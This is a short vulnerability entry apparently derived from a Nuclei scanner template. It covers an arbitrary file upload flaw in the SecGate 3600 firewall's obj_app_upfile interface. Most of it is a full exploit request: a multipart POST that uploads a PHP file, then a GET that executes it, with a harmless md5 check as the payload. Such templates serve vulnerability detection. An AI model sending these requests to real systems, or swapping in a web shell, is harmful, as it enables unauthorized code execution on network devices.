# Vulnerability: SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload
**Classification:** CWE-434
**Source:** Nuclei Template (`secgate-3600-file-upload.yaml`)

## Description
There is an arbitrary file upload vulnerability in the obj_app_upfile interface of Internet SecGate 3600 firewall. An attacker can obtain server permissions by constructing a special request package.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /?g=obj_app_upfile HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{string}}
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundary{{string}}
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundary{{string}}
Content-Disposition: form-data; name="upfile"; filename="{{filename}}.php"
Content-Type: text/plain

<?php echo md5("{{string}}");unlink(__FILE__);?>

------WebKitFormBoundary{{string}}
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundary{{string}}
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundary{{string}}--

GET /attachements/{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

